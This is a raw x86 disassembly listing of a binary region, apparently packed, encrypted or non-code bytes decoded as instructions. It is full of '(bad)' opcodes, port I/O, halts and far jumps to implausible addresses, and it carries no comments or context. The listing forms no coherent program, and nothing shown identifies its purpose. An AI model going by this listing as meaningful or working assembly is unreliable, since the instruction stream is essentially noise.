  413550:	enter  0xefe2,0xc7
  413554:	bnd ret 
  413556:	jmp    0x413549
  413558:	aad    0xb0
  41355a:	mov    cl,0xf6
  41355c:	hlt    
  41355d:	mov    ecx,0xd1dcbceb
  413562:	out    dx,al
  413563:	add    dl,dl
  413565:	add    eax,0xf1f4e6
  41356a:	stc    
  41356b:	mov    esi,0xea08fdfd
  413570:	add    ecx,eax
  413572:	mov    ebp,0xeacfddca
  413577:	mov    ah,0xe3
  413579:	cmc    
  41357a:	mov    cl,0xc0
  41357c:	repz rcr dh,1
  41357f:	(bad)  
  413580:	loop   0x413558
  413582:	add    esi,ebx
  413584:	into   
  413585:	fcmovbe st,st(2)
  413587:	fpatan 
  413589:	cli    
  41358a:	or     esi,esp
  41358c:	add    cl,ch
  41358e:	jmp    0xbfbd:0xc6fe01ef
  413595:	int3   
  413596:	shl    dh,0xc3
  413599:	repz in eax,0xb8
  41359c:	out    0xb8,eax
  41359e:	(bad)  
  4135a0:	ror    ecx,1
  4135a2:	add    bl,ch
  4135a4:	mov    eax,0xdb00bce6
  4135a9:	fsubr  st(1),st
  4135ab:	loop   0x4135a5
  4135ad:	push   cs
  4135ae:	cmc    
  4135af:	jecxz  0x413579
  4135b1:	fild   QWORD PTR [ebp-0x1d2a153b]
  4135b7:	shl    ch,0xd5
  4135ba:	(bad)  
  4135bc:	shl    cl,cl
  4135be:	fsincos 
  4135c0:	mov    ah,0xfb
  4135c2:	jecxz  0x41357a
  4135c4:	lock add ch,ch
  4135c7:	out    0xe7,eax
  4135c9:	fiadd  DWORD PTR [eax]
  4135cb:	out    0xd6,al
  4135cd:	fsubrp st(4),st
  4135cf:	hlt    
  4135d0:	add    dl,dl
  4135d2:	into   
  4135d3:	int    0xc8
  4135d5:	in     eax,0xaf
  4135d7:	in     al,dx
  4135d8:	jmp    0xdf1b0bb4
  4135dd:	iret   
  4135de:	mov    ecx,0xedbbf8bb
  4135e3:	mov    ecx,0xfad8f1f7
  4135e8:	mov    ecx,0xc0ffd1f5
  4135ed:	hlt    
  4135ee:	fucomip st,st(0)
  4135f0:	loop   0x4135f4
  4135f2:	ret    0xbff7
  4135f5:	fmulp  st(1),st
  4135f7:	retf   0xecc1
  4135fa:	mov    edx,0xf1b9b4f3
  4135ff:	(bad)  
  413600:	fld    QWORD PTR [ebx]
  413602:	add    DWORD PTR [esi-0x41054212],edi
  413608:	inc    BYTE PTR [ecx]
  41360a:	fsub   st,st(1)
  41360c:	jmp    0x413615
  41360e:	jmp    edx
  413610:	leave  
  413611:	(bad)  
  413613:	test   al,0xb3
  413615:	loope  0x413600
  413617:	lods   eax,DWORD PTR ds:[esi]
  413618:	enter  0xf3d1,0xc8
  41361c:	sar    BYTE PTR [eax-0x7151216],cl
  413622:	hlt    
  413623:	add    bh,bl
  413625:	(bad)  
  413626:	fdivr  DWORD PTR [edx-0x1d21fe09]
  41362c:	push   cs
  41362d:	in     eax,0xe6
  41362f:	in     al,0xc5
  413631:	push   cs
  413632:	in     al,0xad
  413634:	int    0xde
  413636:	lods   al,BYTE PTR ds:[esi]
  413637:	call   0xaf17120a
  41363c:	jmp    0xd8e1:0xdbbbfab8
  413643:	out    dx,eax
  413644:	aam    0xe0
  413646:	add    edi,ebp
  413648:	jecxz  0x41360d
  41364a:	mov    BYTE PTR ds:0xfbe2d5bd,0xe
  413651:	std    
  413652:	into   
  413653:	retf   0xb7e0
  413656:	out    dx,eax
  413657:	iret   
  413658:	(bad)  
  413659:	(bad)  
  41365a:	mov    ecx,0xdcd2f9f8
  41365f:	fxch   st(7)
  413661:	iret   
  413662:	ror    dh,1
  413664:	sar    cl,cl
  413666:	out    0xd0,eax
  413668:	(bad)  
  413669:	or     edx,esp
  41366b:	in     eax,0x6
  41366d:	out    dx,eax
  41366e:	jmp    0xe64d115b
  413673:	call   0xed2ced4f
  413678:	lock in eax,0xf5
  41367b:	mov    edx,0xccc8ffeb
  413680:	mov    ch,0xfa
  413682:	(bad)  
  413684:	mov    esi,0xfa00fdf6
  413689:	loope  0x413680
  41368b:	loop   0x413684
  41368d:	out    0xed,eax
  41368f:	stc    
  413690:	loope  0x413690
  413692:	icebp  
  413693:	fsubr  DWORD PTR [eax-0x1d150f2f]
  413699:	loopne 0x41368d
  41369b:	cli    
  41369c:	clc    
  41369d:	iret   
  41369e:	aam    0xda
  4136a0:	iret   
  4136a1:	add    al,bl
  4136a3:	mov    edi,0xbec2d3fb
  4136a8:	aam    0xfb
  4136aa:	aad    0xcb
  4136ac:	pmulhuw mm2,mm4
  4136af:	leave  
  4136b0:	add    BYTE PTR [eax+ecx*8],cl
  4136b3:	int    0xad
  4136b5:	in     eax,0xac
  4136b7:	in     eax,dx
  4136b8:	hlt    
  4136b9:	sar    BYTE PTR [edx-0x263a442b],0xd7
  4136c0:	fild   DWORD PTR [edx]
  4136c2:	mov    esi,0xe2b8c1e3
  4136c7:	inc    ebp
  4136c9:	add    dh,bh
  4136cb:	fmulp  st(7),st
  4136cd:	(bad)  
  4136ce:	out    0xfc,al
  4136d0:	in     al,dx
  4136d1:	(bad)  
  4136d2:	jmp    0xc1d6:0xcbcad3d8
  4136d9:	mov    al,0xd6
  4136db:	mov    ecx,0xb6b6fdc9
  4136e0:	shl    eax,cl
  4136e2:	int3   
  4136e3:	std    
  4136e4:	jecxz  0x4136d3
  4136e6:	xlat   BYTE PTR ds:[ebx]
  4136e7:	clc    
  4136e8:	cli    
  4136e9:	retf   0xdde9
  4136ec:	add    dh,ch
  4136ee:	add    DWORD PTR [ebx],ecx
  4136f0:	repz (bad) 
  4136f3:	(bad)  
  4136f4:	shl    bh,cl
  4136f6:	loope  0x4136df
  4136f8:	(bad)  
  4136fa:	cmc    
  4136fb:	mov    ah,0xe9
  4136fd:	in     al,dx
  4136fe:	hlt    
  4136ff:	stc    
  413700:	mov    edx,0xfabaf4c2
  413705:	out    0xd1,eax
  413707:	out    0xfa,eax
  413709:	add    eax,0xefd5ddc2
  41370e:	loopne 0x413703
  413710:	push   cs
  413711:	or     ebp,DWORD PTR [esi-0x5442502e]
  413717:	lock mov ch,0xb5
  41371a:	retf   0xbbfa
  41371d:	retf   0xdddb
  413720:	in     al,dx
  413721:	in     al,dx
  413722:	out    dx,al
  413723:	fcomi  st,st(7)
  413725:	fsubr  st(7),st
  413727:	add    ebp,edx
  413729:	loope  0x413703
  41372b:	call   0xee264014
  413730:	cld    
  413731:	sar    BYTE PTR [ebx+esi*8-0x483f1d0d],0xd1
  413739:	sti    
  41373a:	mov    bh,0xef
  41373c:	les    edi,FWORD PTR [eax+0x2fdbbf6]
  413742:	ret    0xedbe
  413745:	aam    0xe4
  413747:	repz fdiv st(5),st
  41374a:	add    ebx,esp
  41374c:	aad    0xe3
  41374e:	int    0xcc
  413750:	jmp    0x413740
  413752:	in     eax,dx
  413753:	loop   0x413746
  413755:	retf   0xbcb1
  413758:	mov    ch,0xcb
  41375a:	mov    dh,0xcd
  41375c:	fisubr DWORD PTR [esp+ebx*8-0x3c044025]
  413763:	out    dx,al
  413764:	repz sti 
  413766:	mov    ebx,0xfdd400be
  41376b:	jmp    0x413762
  41376d:	jmp    0x30e3051
  413772:	fisub  WORD PTR [esi-0x351f1024]
  413778:	jmp    0x413750
  41377a:	mov    ecx,0xb7ecefc7
  41377f:	shr    ebp,1
  413781:	aad    0xbf
  413783:	out    dx,eax
  413784:	neg    esp
  413786:	aam    0xdc
  413788:	sar    ebp,1
  41378a:	aam    0xda
  41378c:	clc    
  41378d:	(bad)  
  41378e:	inc    DWORD PTR [esp+ebx*8]
  413791:	into   
  413792:	repz (bad) 
  413794:	in     al,dx
  413795:	test   ah,0xe0
  413798:	loopne 0x41376d
  41379a:	aam    0xba
  41379c:	aad    0xcf
  41379e:	icebp  
  41379f:	call   0xd73fec8e
  4137a4:	jecxz  0x413765
  4137a6:	add    al,0xe4
  4137a8:	ret    
  4137a9:	mov    esp,0xbcc6dbd1
  4137ae:	stc    
  4137af:	adc    ebx,esp
  4137b1:	push   cs
  4137b2:	into   
  4137b3:	ret    
  4137b4:	jmp    0xd4d2:0xd4f6cfe6
  4137bb:	scas   al,BYTE PTR es:[edi]
  4137bc:	enter  0xefff,0xd7
  4137c0:	rcl    al,1
  4137c2:	int    0xbd
  4137c4:	neg    eax
  4137c6:	(bad)  
  4137c7:	(bad)  
  4137c8:	cld    
  4137c9:	pop    es
  4137ca:	xlat   BYTE PTR ds:[ebx]
  4137cb:	add    al,0x0
  4137cd:	dec    DWORD PTR [edi]
  4137cf:	add    BYTE PTR [ecx+ecx*8],cl
  4137d2:	mov    cl,0xdf
  4137d4:	lods   al,BYTE PTR ds:[esi]
  4137d5:	enter  0xb5d3,0xd0
  4137d9:	shr    ah,0xf6
  4137dc:	enter  0xfff8,0xc4
  4137e0:	fcmovnbe st,st(5)
  4137e2:	ret    
  4137e3:	rol    DWORD PTR [edi],0x6
  4137e6:	sar    ecx,1
  4137e8:	mov    ecx,0xf6efc2c1
  4137ed:	or     ch,dl
  4137ef:	stc    
  4137f0:	out    dx,al
  4137f1:	or     dl,cl
  4137f3:	mov    al,0xb7
  4137f5:	lods   al,BYTE PTR ds:[esi]
  4137f6:	fsubr  st(0),st
  4137f8:	int3   
  4137f9:	shr    esi,0xcd
  4137fc:	xlat   BYTE PTR ds:[ebx]
  4137fd:	repnz in eax,dx
  4137ff:	hlt    
  413800:	(bad)  
  413801:	mov    eax,0xb8d0e0e0
  413806:	aam    0xde
  413808:	add    BYTE PTR [edx],cl
  41380a:	rcr    cl,1
  41380c:	call   0x42f3c07
  413811:	or     ebp,edx
  413813:	shl    al,1
  413815:	out    0xc0,al
  413817:	mov    ah,0xfa
  413819:	mov    dh,0xea
  41381b:	shl    cl,1
  41381d:	xlat   BYTE PTR ds:[ebx]
  41381e:	mov    dh,0xd4
  413820:	mov    esi,0xc701cccd
  413825:	neg    edi
  413827:	jecxz  0x4137ee
  413829:	cli    
  41382a:	or     ah,al
  41382c:	cld    
  41382d:	add    al,0xea
  41382f:	fmul   DWORD PTR [eax+ebp*8]
  413832:	scas   eax,DWORD PTR es:[edi]
  413833:	into   
  413834:	scas   eax,DWORD PTR es:[edi]
  413835:	int    0xb3
  413837:	(bad)  [edi-0x4f31393c]
  41383d:	out    0xfe,al
  41383f:	icebp  
  413840:	cld    
  413841:	(bad)  
  413843:	sti    
  413844:	(bad)  
  413846:	mov    esp,0xe4eae6ff
  41384b:	in     al,0xd6
  41384d:	aam    0xce
  41384f:	fucomip st,st(2)
  413851:	fld    st(0)
  413853:	mov    bl,0xdd
  413855:	leave  
  413856:	mov    ebp,0xefb3e0ec
  41385b:	sar    BYTE PTR [edi-0x30094448],1
  413861:	out    dx,eax
  413862:	repnz (bad) 
  413864:	mov    esi,0xfbffbfee
  413869:	(bad)  
  41386a:	or     BYTE PTR [edx],al
  41386c:	sti    
  41386d:	cli    
  41386e:	in     eax,0xe7
  413870:	add    al,0x7
  413872:	(bad)  
  413873:	rol    cl,1
  413875:	rcr    ch,0xee
  413878:	retf   
  413879:	neg    eax
  41387b:	mov    bh,0xd8
  41387d:	call   0xbd1e0a5b
  413882:	fcmovne st,st(4)
  413884:	add    dl,ch
  413886:	inc    esi
  413888:	fst    st(0)
  41388a:	ret    0xe0fb
  41388d:	fcmovnu st,st(6)
  41388f:	(bad)  
  413891:	std    
  413892:	repnz test eax,0xe1d0d4eb
  413899:	vpsubw xmm6,xmm4,xmm6
  41389d:	out    0xd3,al
  41389f:	mov    ch,0xd0
  4138a1:	fld    DWORD PTR [eax]
  4138a3:	sar    DWORD PTR [eax-0x29042223],1
  4138a9:	loopne 0x413870
  4138ab:	fild   WORD PTR [ecx]
  4138ad:	add    al,0x3
  4138af:	push   cs
  4138b0:	rcr    esp,0xdf
  4138b3:	ret    
  4138b4:	iret   
  4138b5:	fdivr  st(2),st
  4138b7:	aam    0xdb
  4138b9:	(bad)  
  4138ba:	retf   
  4138bb:	out    0xe5,eax
  4138bd:	int    0xba
  4138bf:	div    esi
  4138c1:	rcr    edx,1
  4138c3:	sar    esp,1
  4138c5:	(bad)  
  4138c7:	(bad)  
  4138c8:	(bad)  
  4138ca:	fsubr  st,st(7)
  4138cc:	out    dx,al
  4138cd:	fmul   st(3),st
  4138cf:	or     al,0xc4
  4138d1:	pop    es
  4138d2:	enter  0xefc3,0xeb
  4138d6:	lods   al,BYTE PTR ds:[esi]
  4138d7:	xlat   BYTE PTR ds:[ebx]
  4138d8:	lock into 
  4138da:	aam    0xb4
  4138dc:	jmp    0x4138d7
  4138de:	mov    dh,0xec
  4138e0:	sar    BYTE PTR [esi-0x384a211f],cl
  4138e6:	cli    
  4138e7:	(bad)  
  4138e8:	repz clc 
  4138ea:	cld    
  4138eb:	loop   0x4138b1
  4138ed:	fmul   st,st(2)
  4138ef:	out    0xc4,al
  4138f1:	or     edi,DWORD PTR [ebp-0x155b4e37]
  4138f7:	in     al,0xd0
  4138f9:	hlt    
  4138fa:	xlat   BYTE PTR ds:[ebx]
  4138fb:	mov    al,0xbf
  4138fd:	imul   bh
  4138ff:	aam    0xba
  413901:	mov    ebp,0xf1fb00c2
  413906:	out    0xc6,eax
  413908:	jecxz  0x4138fb
  41390a:	clc    
  41390b:	or     al,BYTE PTR [eax]
  41390d:	or     ebp,ecx
  41390f:	push   cs
  413910:	push   es
  413911:	sar    BYTE PTR [eax-0x174f1621],0xd7
  413918:	sti    
  413919:	leave  
  41391a:	icebp  
  41391b:	(bad)  
  41391c:	fdiv   st,st(5)
  41391e:	in     eax,0xcb
  413920:	(bad)  
  413922:	mov    edx,0xf5c1f300
  413927:	pop    es
  413928:	add    al,dh
  41392a:	cld    
  41392b:	push   es
  41392c:	in     al,0xe8
  41392e:	out    0xe7,eax
  413930:	stc    
  413931:	or     al,dl
  413933:	iret   
  413934:	scas   eax,DWORD PTR es:[edi]
  413935:	scas   eax,DWORD PTR es:[edi]
  413936:	ror    esp,0xbb
  413939:	iret   
  41393a:	int    0xf9
  41393c:	retf   
  41393d:	sti    
  41393e:	(bad)  
  41393f:	mov    esi,0xd3ceecbd
  413944:	rol    BYTE PTR [ecx],cl
  413946:	in     eax,0xfa
  413948:	stc    
  413949:	neg    bh
  41394b:	les    eax,FWORD PTR ds:0xe2e8dee9
  413951:	or     ebx,ebp
  413953:	in     al,0xc6
  413955:	lock repz (bad) 
  413958:	aam    0xea
  41395a:	repnz stc 
  41395c:	in     eax,dx
  41395d:	(bad)  
  41395f:	stc    
  413960:	hlt    
  413961:	mov    ebp,0xf2000702
  413966:	(bad)  
  413968:	jecxz  0x413934
  41396a:	add    cl,BYTE PTR [edx]
  41396c:	test   DWORD PTR [eax],0xf3c1ece4
  413972:	shr    esi,1
  413974:	repnz scas al,BYTE PTR es:[edi]
  413976:	repnz loopne 0x413943
  413979:	(bad)  
  41397a:	mul    ch
  41397c:	fcomi  st,st(5)
  41397e:	retf   0xd4f7
  413981:	hlt    
  413982:	enter  0xd4e8,0xfb
  413986:	sti    
  413987:	rol    edx,0xfa
  41398a:	(bad)  
  41398b:	ror    ebx,0xd4
  41398e:	jecxz  0x41399f
  413990:	sti    
  413991:	loop   0x41396c
  413993:	lock (bad) 
  413995:	leave  
  413996:	hlt    
  413997:	mov    bl,0xc0
  413999:	lock loope 0x41398a
  41399c:	xlat   BYTE PTR ds:[ebx]
  41399d:	(bad)  
  41399e:	repnz jecxz 0x413984
  4139a1:	jmp    0xdf3236a8
  4139a6:	test   DWORD PTR [ebx],0xc5d406bd
  4139ac:	std    
  4139ad:	(bad)  
  4139af:	jmp    0x4139bc
  4139b1:	ffree  st(2)
  4139b3:	in     eax,dx
  4139b4:	fsub   st(4),st
  4139b6:	hlt    
  4139b7:	sar    edx,1
  4139b9:	sar    DWORD PTR [ebx-0x2e37064a],1
  4139bf:	mov    esp,0xedbe01b1
  4139c4:	(bad)  
  4139c5:	lock fadd QWORD PTR [ebx+edx*8]
  4139c9:	hlt    
  4139ca:	test   DWORD PTR [edx],0xfde606ca
  4139d0:	or     cl,BYTE PTR [ecx]
  4139d2:	leave  
  4139d3:	faddp  st(0),st
  4139d5:	mov    bl,0xd2
  4139d7:	shr    DWORD PTR [ecx-0x92a2d2a],cl
  4139dd:	(bad)  
  4139df:	xlat   BYTE PTR ds:[ebx]
  4139e0:	mov    edx,0xf2e7f9cf
  4139e5:	mov    ebp,0xb8e6dafe
  4139ea:	ret    
  4139eb:	mov    esi,0xe8d40406
  4139f0:	fmul   DWORD PTR [eax+edx*8]
  4139f3:	jmp    0xd0b2:0xe9f2dcaf
  4139fa:	enter  0xfbcd,0xe4
  4139fe:	(bad)  
  413a01:	fstp   st(1)
  413a03:	mov    edx,0xf406faf4
  413a08:	(bad)  
  413a09:	repnz loopne 0x4139d7
  413a0c:	add    eax,0x5e2e505
  413a11:	add    ecx,esp
  413a13:	mov    bl,0xec
  413a15:	(bad)  
  413a17:	sti    
  413a18:	not    ebx
  413a1a:	div    edi
  413a1c:	in     eax,dx
  413a1d:	cmc    
  413a1e:	(bad)  
  413a20:	add    eax,edx
  413a22:	(bad)  
  413a24:	iret   
  413a25:	in     al,dx
  413a26:	(bad)  
  413a28:	(bad)  
  413a2a:	les    eax,FWORD PTR [edx+eiz*8]
  413a2d:	mov    esp,0x5cbcdc3
  413a32:	fsubr  DWORD PTR [edi+ebx*8-0x3e1e154f]
  413a39:	mov    ebx,0xcaf7edc5
  413a3e:	repnz sar DWORD PTR [ebp-0x430d25fd],1
  413a45:	add    esp,esp
  413a47:	ret    
  413a48:	sar    edi,cl
  413a4a:	or     dh,bh
  413a4c:	cmc    
  413a4d:	or     esp,edi
  413a4f:	or     ebp,eax
  413a51:	retf   
  413a52:	into   
  413a53:	in     eax,dx
  413a54:	mov    cl,0xbd
  413a56:	leave  
  413a57:	retf   0xe4f5
  413a5a:	in     eax,dx
  413a5b:	div    BYTE PTR [esi-0xa132d47]
  413a61:	retf   0xfdda
  413a64:	test   ch,0xdf
  413a67:	mov    esi,0xdddce0d1
  413a6c:	retf   0xf9df
  413a6f:	jecxz  0x413a75
  413a71:	fistp  QWORD PTR [ecx-0x3a121a16]
  413a77:	jmp    0xfc29213c
  413a7c:	fdiv   st,st(1)
  413a7e:	fstp   st(4)
  413a80:	jmp    0xdc1a1383
  413a85:	aad    0xde
  413a87:	mov    esp,0xdefefce4
  413a8c:	add    eax,0xe0ead904
  413a91:	retf   0xf1e4
  413a94:	(bad)  
  413a96:	enter  0xece6,0xc4
  413a9a:	mov    ebx,0xd0c9b0b0
  413a9f:	enter  0xfff8,0xfd
  413aa3:	sar    BYTE PTR [ebp-0x52c3aff],0xf7
  413aaa:	sti    
  413aab:	(bad)  
  413aad:	(bad)  
  413aaf:	add    ecx,ebx
  413ab1:	bnd jmp 0x413a61
  413ab4:	call   0xe71d2279
  413ab9:	cmc    
  413aba:	out    dx,al
  413abb:	(bad)  
  413abc:	int3   
  413abd:	mov    ebx,0xcff1f0ef
  413ac2:	std    
  413ac3:	fld    QWORD PTR [eax]
  413ac5:	aam    0xfb
  413ac7:	lock icebp 
  413ac9:	add    esi,ecx
  413acb:	add    esi,edx
  413acd:	add    bl,ah
  413acf:	pop    es
  413ad0:	in     eax,0x3
  413ad2:	out    dx,al
  413ad3:	mov    esp,0xcbb6d6e4
  413ad8:	rcl    edi,0xfb
  413adb:	int3   
  413adc:	fidivr DWORD PTR [edx-0x36283213]
  413ae2:	mov    esi,0xc3d5f9f7
  413ae7:	fcmovnbe st,st(1)
  413ae9:	jecxz  0x413aab
  413aeb:	ret    0xe7fe
  413aee:	(bad)  
  413aef:	psubusb mm1,mm1
  413af2:	(bad)  
  413af4:	test   eax,0xf1adf0ce
  413af9:	loope  0x413ab4
  413afb:	jmp    0x413ac1
  413afd:	retf   
  413afe:	fdiv   st,st(1)
  413b00:	sti    
  413b01:	fld    QWORD PTR [edx]
  413b03:	loope  0x413abe
  413b05:	clc    
  413b06:	std    
  413b07:	or     esi,ebx
  413b09:	in     eax,0xf5
  413b0b:	(bad)  
  413b0c:	out    0xe2,eax
  413b0e:	or     ecx,DWORD PTR [edi]
  413b10:	add    eax,0xeedcb8fc
  413b15:	loop   0x413b02
  413b17:	mov    bl,0xf0
  413b19:	iret   
  413b1a:	call   0xc01c35e3
  413b1f:	stc    
  413b20:	mov    ecx,0xdbd3e8ba
  413b25:	call   edx
  413b27:	aad    0xc7
  413b29:	aad    0xf1
  413b2b:	test   bh,0xd5
  413b2e:	cld    
  413b2f:	fucomp st(7)
  413b31:	std    
  413b32:	mov    esi,0xbccfbcdc
  413b37:	mov    bh,0xd4
  413b39:	aam    0xc9
  413b3b:	rcl    esp,cl
  413b3d:	lods   al,BYTE PTR ds:[esi]
  413b3e:	mov    ah,0xc4
  413b40:	out    dx,eax
  413b41:	not    bh
  413b43:	repnz shl al,0xe7
  413b47:	aad    0xf7
  413b49:	rcl    bh,0x7
  413b4c:	add    BYTE PTR [edi],cl
  413b4e:	out    0xeb,al
  413b50:	out    0xe8,eax
  413b52:	shl    DWORD PTR [edx-0x291a353d],0xeb
  413b59:	leave  
  413b5a:	repz int3 
  413b5c:	out    dx,eax
  413b5d:	out    dx,al
  413b5e:	(bad)  
  413b60:	shr    ah,cl
  413b62:	fadd   QWORD PTR [ecx]
  413b64:	add    ah,cl
  413b66:	cld    
  413b67:	neg    edx
  413b69:	cmc    
  413b6a:	add    bh,bh
  413b6c:	fxch   st(2)
  413b6e:	(bad)  
  413b70:	jmp    0xc2021e61
  413b75:	icebp  
  413b76:	mov    cl,0xc7
  413b78:	jmp    0xe4d8:0xedcfe4d5
  413b7f:	(bad)  
  413b81:	mov    esp,0xccdec001
  413b86:	mov    ebx,0xc3c7c3e3
  413b8b:	loopne 0x413b9b
  413b8d:	jmp    0xf03a388d
  413b92:	retf   0xb0f0
  413b95:	(bad)  
  413b97:	out    0xe6,al
  413b99:	enter  0xf4eb,0xd4
  413b9d:	iret   
  413b9e:	(bad)
  413ba1:	mov    ah,0xff
  413ba3:	out    dx,al
  413ba4:	cmc    
  413ba5:	cmc    
  413ba6:	(bad)  
  413ba9:	inc    DWORD PTR [ebx]
  413bab:	loope  0x413b87
  413bad:	retf   
  413bae:	jmp    0x413bbe
  413bb0:	shl    ebp,0xca
  413bb3:	int3   
  413bb4:	lods   al,BYTE PTR ds:[esi]
  413bb5:	lods   al,BYTE PTR ds:[esi]
  413bb6:	out    dx,eax
  413bb7:	shr    BYTE PTR [ebp+eiz*8-0x6443a2b],cl
  413bbe:	std    
  413bbf:	mov    ah,0xe2
  413bc1:	mov    al,0xd2
  413bc3:	fcos   
  413bc5:	int3   
  413bc6:	mov    edi,0xe302cbf1
  413bcb:	jmp    0x413b9c
  413bcd:	sldt   WORD PTR [eax+eiz*8]
  413bd1:	in     al,dx
  413bd2:	shr    BYTE PTR [eax-0x2e4e344d],0xcd
  413bd9:	mov    ebx,0xd4bad9ee
  413bde:	fst    st(7)
  413be0:	std    
  413be1:	int    0xed
  413be3:	shl    ah,0xbc
  413be6:	int    0xbd
  413be8:	repnz or DWORD PTR [edi],eax
  413beb:	out    0xf9,al
  413bed:	ror    dl,0xf
  413bf0:	(bad)  
  413bf1:	retf   0xc3d9
  413bf4:	mov    ebp,0xccc7c9c5
  413bf9:	in     al,dx
  413bfa:	icebp  
  413bfb:	clc    
  413bfc:	mov    cl,0xc9
  413bfe:	mov    bl,0xf7
  413c00:	(bad)  
  413c01:	mov    esp,0xdfd8f1ef
  413c06:	mov    edi,0xcb0705da
  413c0b:	out    dx,eax
  413c0c:	stc    
  413c0d:	or     bh,ah
  413c0f:	repz cli 
  413c11:	fisubr WORD PTR [ebx-0x9193b54]
  413c17:	out    0xe8,al
  413c19:	shl    BYTE PTR [ecx-0x1349472c],cl
  413c1f:	mov    ebp,0xcecec9f6
  413c24:	aad    0xf5
  413c26:	std    
  413c27:	ret    
  413c28:	out    0xd1,al
  413c2a:	shl    edi,0xf9
  413c2d:	(bad)  
  413c2e:	int    0x0
  413c30:	(bad)  
  413c31:	jmp    0xb1d1:0xe2e8c9e1
  413c38:	out    0xb3,eax
  413c3a:	icebp  
  413c3b:	mov    al,0xb8
  413c3d:	out    dx,eax
  413c3e:	(bad)  
  413c3f:	cmc    
  413c40:	std    
  413c41:	shr    eax,cl
  413c43:	in     eax,dx
  413c44:	cli    
  413c45:	jecxz  0x413c40
  413c47:	std    
  413c48:	mov    ebp,0xe408030b
  413c4d:	jmp    0x413c12
  413c4f:	(bad)  
  413c51:	clc    
  413c52:	test   al,0xdc
  413c54:	mov    dl,0xe2
  413c56:	int    0xe6
  413c58:	aam    0xea
  413c5a:	cli    
  413c5b:	out    dx,eax
  413c5c:	retf   0xf1f7
  413c5f:	les    eax,FWORD PTR [ebx]
  413c61:	add    ecx,edi
  413c63:	fld    QWORD PTR [esi]
  413c65:	out    dx,al
  413c66:	loopne 0x413c34
  413c68:	pop    es
  413c69:	xlat   BYTE PTR ds:[ebx]
  413c6a:	(bad)  
  413c6c:	sti    
  413c6d:	fsub   st,st(1)
  413c6f:	add    ebp,edi
  413c71:	loopne 0x413c4b
  413c73:	les    ebp,FWORD PTR [edi+esi*4-0x2d363316]
  413c7a:	stc    
  413c7b:	lds    ebp,FWORD PTR [ebp-0x46142105]
  413c81:	iret   
  413c82:	aad    0xf6
  413c84:	add    bl,cl
  413c86:	in     al,dx
  413c87:	repnz hlt 
  413c89:	shl    ebp,0xe5
  413c8c:	aad    0xf6
  413c8e:	aam    0xd
  413c90:	stc    
  413c91:	pop    es
  413c92:	out    0xe5,eax
  413c94:	int3   
  413c95:	scas   eax,DWORD PTR es:[edi]
  413c96:	scas   al,BYTE PTR es:[edi]
  413c97:	mov    esp,0xc6b5d0fb
  413c9c:	repz fmulp st(3),st
  413c9f:	(bad)  
  413ca0:	call   0xc81a0d60
  413ca5:	mov    eax,0xc0fbf6fd
  413caa:	ret    
  413cab:	lock jmp 0x413c79
  413cae:	aam    0x8
  413cb0:	or     ebx,ebp
  413cb2:	jmp    0x413c9c
  413cb4:	jmp    0xd730f09e
  413cb9:	icebp  
  413cba:	int3   
  413cbb:	(bad)  
  413cbd:	mov    bh,0xb8
  413cbf:	leave  
  413cc0:	hlt    
  413cc1:	add    edi,DWORD PTR [eax-0x1e1d1032]
  413cc7:	fstp   st(0)
  413cc9:	rol    ebp,0xc2
  413ccc:	fadd   QWORD PTR [ebx]
  413cce:	push   cs
  413ccf:	jecxz  0x413cbc
  413cd1:	int3   
  413cd2:	shl    BYTE PTR [eax-0x14143b57],1
  413cd8:	mov    ebx,0xf0d3edc8
  413cdd:	imul   dh
  413cdf:	fcmove st,st(2)
  413ce1:	cli    
  413ce2:	iret   
  413ce3:	loopne 0x413cec
  413ce5:	out    dx,al
  413ce6:	sar    al,cl
  413ce8:	loope  0x413cbe
  413cea:	leave  
  413ceb:	(bad)  
  413cec:	fcomip st,st(4)
  413cee:	aam    0xf
  413cf0:	out    dx,al
  413cf1:	push   cs
  413cf2:	mov    ebp,0xf0ccb0c3
  413cf7:	ror    ebx,cl
  413cf9:	(bad)
  413cfc:	call   0xf11816bf
  413d01:	aam    0xee
  413d03:	repz repnz mov ebp,0xf2f0c402
  413d0a:	add    ebx,ecx
  413d0c:	jecxz  0x413cf6
  413d0e:	leave  
  413d0f:	fsubp  st(3),st
  413d11:	out    0xc0,eax
  413d13:	repnz mov bh,0xcb
  413d16:	scas   eax,DWORD PTR es:[edi]
  413d17:	ret    
  413d18:	repnz div ebx
  413d1b:	mov    dh,0xe7
  413d1d:	cmc    
  413d1e:	lock call 0x1c32d5
  413d24:	lock cld 
  413d26:	aad    0xdc
  413d28:	mov    ecx,0xc00f0af4
  413d2d:	cld    
  413d2e:	hlt    
  413d2f:	cld    
  413d30:	fucomip st,st(2)
  413d32:	icebp  
  413d33:	mov    al,0xed
  413d35:	shl    BYTE PTR [ecx-0x4e08360a],0xc0
  413d3c:	fadd   st,st(5)
  413d3e:	in     eax,dx
  413d3f:	mov    edi,0xf6edd702
  413d44:	loope  0x413d23
  413d46:	ret    0x2dc
  413d49:	or     esi,eax
  413d4b:	fcmovne st,st(1)
  413d4d:	out    dx,eax
  413d4e:	out    dx,al
  413d4f:	repz sti 
  413d51:	cld    
  413d52:	loop   0x413d43
  413d54:	loopne 0x413d1c
  413d56:	mov    dh,0xf1
  413d58:	lods   al,BYTE PTR ds:[esi]
  413d59:	mov    ebx,0xd0f8d1d4
  413d5e:	mov    eax,0xf3dcc8b4
  413d63:	mov    ebp,0xdfd2fbc7
  413d68:	lds    eax,FWORD PTR [edi]
  413d6a:	std    
  413d6b:	std    
  413d6c:	pop    es
  413d6d:	out    dx,eax
  413d6e:	(bad)  
  413d6f:	out    0xeb,al
  413d71:	bnd ret 0xaef0
  413d75:	test   al,0xe0
  413d77:	loop   0x413d2f
  413d79:	jmp    0xfffd:0xf4d3ffb3
  413d80:	call   0xd2332d51
  413d85:	loopne 0x413d4d
  413d87:	inc    al
  413d89:	(bad)  
  413d8a:	call   0xce4c3858
  413d8f:	out    0xc9,eax
  413d91:	(bad)  
  413d93:	fild   QWORD PTR [ebp-0x5145030]
  413d99:	enter  0xd1d9,0xee
  413d9d:	std    
  413d9e:	cmc    
  413d9f:	enter  0xf1f6,0xe1
  413da3:	in     al,dx
  413da4:	cmc    
  413da5:	hlt    
  413da6:	add    eax,0xe7d9fcf2
  413dab:	or     bh,bl
  413dad:	loopne 0x413db6
  413daf:	in     al,dx
  413db0:	push   cs
  413db1:	add    ch,ah
  413db3:	iret   
  413db4:	test   eax,0xf6dbe0ac
  413db9:	repz sar DWORD PTR [ecx-0x404b2509],0xde
  413dc1:	cld    
  413dc2:	repz fcomp st(7)
  413dc5:	shl    dl,0xf3
  413dc8:	out    0xe9,al
